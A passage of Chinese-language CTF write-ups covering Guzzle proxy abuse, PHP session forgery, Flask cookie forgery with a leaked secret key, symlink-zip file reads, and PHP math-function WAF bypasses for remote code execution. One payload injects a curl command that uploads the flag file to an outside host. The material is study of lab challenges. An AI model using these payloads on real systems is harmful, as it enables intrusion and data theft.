<td><strong>Go</strong></td>
<td><strong>net/http/cgi</strong></td>
<td><strong>net/http</strong></td>
</tr>
</tbody></table>
<p><strong>Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响</strong></p>
<p>刚开始一直在用buu内网vps进行复现，搞了好几个小时，一直连不上nc，后来在群里问了才知道，buu内网已经做隔离了，要直接访问外网资源，意思就是说直接拿自己的服务器搭呗</p>
<p>创建一个伪造的response  b.txt</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 08 Feb 2021 09:09:21 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>然后nc监听</p>
<blockquote>
<p>nc -lvp  2333 &lt; b.txt</p>
</blockquote>
<p><del>问题就在这里，不管我怎么连，就是连不上</del></p>
<p>最后在burp改包</p>
<p>加一行</p>
<blockquote>
<p>Proxy:xxx.xxx.xxx.xxx:2333</p>
</blockquote>
<p>然后就会返回flag</p>
<h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>知识点：session伪造</p>
<p>知道可以写note，然后可以下载，还知道要admin才可以getflag，session伪造，不过仅限于此猜测是，没什么思路，看了WP才知道，还有源码的存在，下载下来，源码比较简单，主要的代码如下</p>
<p>在export.php中 <code>$filename</code> 由三个参数拼接构成，<del>一般拼接点都是可利用的</del></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu50.jpg"></p>
<p>我们全局搜索下 get_suer()的作用，可以发现为我们登入时使用的user<img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu51.jpg"></p>
<p>再看下session的存储位置，发现和文件的存储位置是一样的<img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu52.jpg"></p>
<p>思路很明显了，伪造session.不过在伪造session之前需要知道session处理器，默认为php</p>
<blockquote>
<p>当 <strong>session.serialize_handler=php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
</blockquote>
<p>做法：</p>
<p>用户名为<code>sess_</code>登入，然后写Note,标题为 <code>|N;admin|b:1;</code>,这样反序列化结果即可为：<code>admin==bool(true)</code> , 最后<code>export.php?type=.</code>即可使得这个<code>.</code>与前面的<code>.</code>拼接成<code>..</code>被替换为空，<code>$filename</code>也就成为了session文件名了</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu53.jpg"></p>
<p>然后修改session，到getflag页面即可得到flag，（不过这里我修改完session,点getflag后并没有flag,需要先到别的页面，再到getflag）</p>
<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>知识点：软链接读文件</p>
<p>随意输入都能登录，登入后查看源码有一处注释可疑</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">404 not found</span></span><br><span class="line"><span class="comment">--&gt;</span>Copy</span><br></pre></td></tr></table></figure>
<p>随便输入访问到404页面，放到burp查看相应包</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Swpuctf_csrf_token</span>: U<span class="number">0</span>VDUkVUX<span class="number">0</span>tFWTprZXlxcXF<span class="number">3</span>d<span class="number">3</span>dlZWUhQCMkJV<span class="number">4</span>mKg==</span><br></pre></td></tr></table></figure>
<p>base64解密为 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p>
<p>脚本直接伪造admin</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c <span class="string">&#x27;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3RYQ.WSpp6_ZvPfQfdlnAX3ZbtSnEOS0&#x27;</span> -s <span class="string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: b<span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;is_login&#x27;</span>: True, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">将id:100改为1</span><br><span class="line"></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> -t &quot;&#123;<span class="string">&#x27;id&#x27;</span>: b<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;is_login&#x27;</span>: True, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3SLw.lL3TAbVjmsDo65DOZhUNjrM8hkc</span><br></pre></td></tr></table></figure>
<p>成功到上传界面，源码有注释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>
<p>定义两个路由,上传的那个路由就是上传一个压缩的图片,服务器进行解压再显示图片,我们这里可上传一个软连接压缩包,来读取其他文件,showflag路由告诉我们flag.jpg放在/flag/flag.jpg</p>
<blockquote>
<p><strong>ln -s是Linux的一种软连接,类似与windows的快捷方式</strong><br><strong>ln -s /etc/passwd forever404 这会出现一个forever404文本,里面包含密码</strong><br><strong>/proc/self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录</strong></p>
</blockquote>
<p><strong>软链接读文件，关键在于怎么获取到flag.jpg绝对路径</strong></p>
<p><strong>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s <span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span>flag/flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qweCopy</span><br></pre></td></tr></table></figure>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu54.jpg"></strong></p>
<p><strong>或者先找到当前目录路径</strong></p>
<p><strong>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</strong></p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /<span class="keyword">proc</span>/self/environ<span class="title"> qqq</span></span><br><span class="line"><span class="title"></span> <span class="title">  zip</span> -ry<span class="title"> qqq.zip</span> qqq</span><br><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg<span class="title"> www</span></span><br><span class="line"><span class="title"></span> <span class="title">  zip</span> -ry<span class="title"> www.zip</span> wwwCopy</span><br></pre></td></tr></table></figure>
<p><strong>将得到的压缩包上传，抓包查看response，即可得到flag</strong></p>
<p><strong>也可以命令注入：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>(III=`awk <span class="string">&#x27;BEGIN&#123;printf \&quot;%c\&quot;, 47&#125;&#x27;</span>`&amp;&amp;<span class="built_in">curl</span> xxx.xxx.xxx.xxx:<span class="number">9999</span> <span class="literal">-T</span> `echo <span class="variable">$</span>&#123;III&#125;ctf<span class="variable">$</span>&#123;III&#125;hgfjakshgfuasguiasg</span><br></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><strong>知识点：</strong></p>
<ol>
<li><code>#include &#39;&#39;</code>预处理编译报错</li>
<li>文件包含</li>
</ol>
<p>首先随便输了个php代码，根据报错发现是<strong>C</strong>语言编译器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World! \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译后下载了一个文件.猜测flag应该是以文件形式存在服务器中，尝试使用<code>#include &#39;&#39;</code>预处理命令</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu55.jpg"></p>
<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>知识点：WAF绕过</p>
<p>和国赛那题一样，就是范围变了下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;    <span class="comment">//国赛的范围是80</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总共三种方法，不过只有异或的方法适合这题</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">()</span></span> 函数：在任意进制之间转换数字。</span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">()</span></span> 函数：把十进制转换为十六进制。</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">()</span></span> 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> ：函数用于输出变量的相关信息。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>


<p><strong>方法一：利用数学函数运算得到函数和命令</strong></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=&lt;command&gt;</span><br></pre></td></tr></table></figure>
<p><em>分析：</em></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span>_GET)&#123;<span class="built_in">abs</span>&#125;) <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>
<p><strong>方法二：拼凑出getallheaders利用HeaderRCE</strong></p>
<blockquote>
<p>getallheaders — 获取全部 HTTP 请求头信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg"></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert,<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">然后抓包在请求头中添加 <span class="number">1</span>：cat /flag</span><br></pre></td></tr></table></figure>
<p>分析</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(getallheaders()</span></span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
<p><strong>方法三：异或</strong></p>
